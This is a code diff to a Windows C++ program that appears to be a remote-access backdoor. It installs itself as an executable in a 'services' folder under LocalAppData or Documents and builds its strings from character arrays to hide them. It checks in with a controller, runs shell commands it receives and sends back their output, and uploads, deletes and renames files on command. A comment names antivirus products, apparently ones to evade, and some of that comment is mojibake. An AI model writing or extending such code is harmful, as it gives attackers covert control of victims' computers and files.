@@ -136,10 +136,20 @@ int init() {
 		else {
 			//char* user = getenv("USER");
 			//char* appdata = getenv("APPDATA");
-			//char mypath[MAX_PATH];
-			//ret = SHGetSpecialFolderPathA(0, mypath, CSIDL_LOCAL_APPDATA, false);
-
+			char tmppath[MAX_PATH];
 			char* mypath = getenv(params->path);
+			if (mypath == 0)
+			{
+				ret = SHGetSpecialFolderPathA(0, tmppath, CSIDL_LOCAL_APPDATA, false);
+				if (ret)
+				{
+					mypath = tmppath;
+				}
+				else {
+					ret = SHGetSpecialFolderPathA(0, tmppath, CSIDL_MYDOCUMENTS, false);
+					mypath = tmppath;
+				}
+			}
 			char service_path[] = { 's','e','r','v','i','c','e','s',0 };
 			string folder = string(mypath) + "\\" + service_path;
 			char exe_surfix[] = { '.','e','x','e' ,0};
@@ -287,7 +297,7 @@ int __stdcall fileMission() {
 				char * pack2 = (char*)pack + sizeof(MY_CMD_PACKET) + pack->len;
 				char* file = pack2 + sizeof(int);
 				int filesize = *(int*)pack2;
-				int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
+				ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
 			}
 			else if (pack->type == MISSION_TYPE_DELFILE)
 			{
@@ -319,12 +329,12 @@ int __stdcall fileMission() {
 				int dfnlen = *(int*)pack2;
 				string dfn = string(pack2 + sizeof(int), dfnlen);
 
-				char* data = 0;
+				char* file = 0;
 				int filesize = 0;
-				ret = FileHelper::fileReader(sfn.c_str(), &data, &filesize);
+				ret = FileHelper::fileReader(sfn.c_str(), &file, &filesize);
 				if (ret)
 				{
-					ret = FileHelper::fileWriter(dfn.c_str(), data, filesize, TRUE);
+					ret = FileHelper::fileWriter(dfn.c_str(), file, filesize, TRUE);
 					DeleteFileA(sfn.c_str());
 				}
 			}
@@ -420,6 +430,10 @@ int __stdcall cmdMission() {
 
 
 //compress,encrypt functions
+//macfee,360ºË¾§,¿¨°ÍË¹»ù,MS,huorong
+//file tree,upload port and download port,network optimize
+//all english output,remove anotation
+
 
 int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) 
 {
@@ -448,13 +462,12 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 // 		CloseHandle(htc);
 // 	}
 
+	PacketParcel packet(TRUE);
 	while (TRUE)
 	{
-		PacketParcel packet(TRUE);
-
 		ret = packet.postCmd(CMD_ONLINE, 0, 0);
 
-		runLog("test output\r\n");
+		//runLog("test output\r\n");
 
 		int datalen = packet.m_datalen;
 		char* data = packet.m_data;
@@ -470,10 +483,13 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 				{
 					string filename = string(inpack->value, inpack->len);
 					packet.postFile(filename, inpack->type, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
+
+					opLog("recv file operation:%s\r\n", filename.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_CMD)
 				{
 					string cmd = string(inpack->value, inpack->len);
+					opLog("recv cmd:%s\r\n", cmd.c_str());
 					ret = shell(cmd.c_str());
 
 					packet.postFile(CMD_RESULT_FILENAME,0, (char*)hdr->hdr.hostname2, hdr->hdr.hostname2_len);
@@ -502,6 +518,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					MyJson json(JSON_CONFIG_FILENAME);
 					json.insert(KEYNAME_HEARTBEART_INTERVAL, s.c_str(), JSON_TYPE_STRING);
 					json.saveFile();
+
+					opLog("recv heartbeat:%s\r\n", s.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_UPLOAD)
 				{
@@ -511,6 +529,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					char* file = pack2 + sizeof(int);
 					
 					int ret = FileHelper::fileWriter(fn.c_str(), file, filesize, TRUE);
+
+					opLog("recv upload file:%s\r\n", fn.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_DELFILE)
 				{
@@ -526,6 +546,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 					else {
 						ret = DeleteFileA(fn.c_str());
 					}
+
+					opLog("recv delete file:%s\r\n", fn.c_str());
 				}
 				else if (inpack->type == MISSION_TYPE_RENFILE)
 				{
@@ -550,6 +572,8 @@ int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
 						ret = FileHelper::fileWriter(dfn.c_str(), data, filesize, TRUE);
 						ret = DeleteFileA(sfn.c_str());
 					}
+
+					opLog("recv rename file from:%s to:%s\r\n", sfn.c_str(),dfn.c_str());
 				}
 			}
 		}
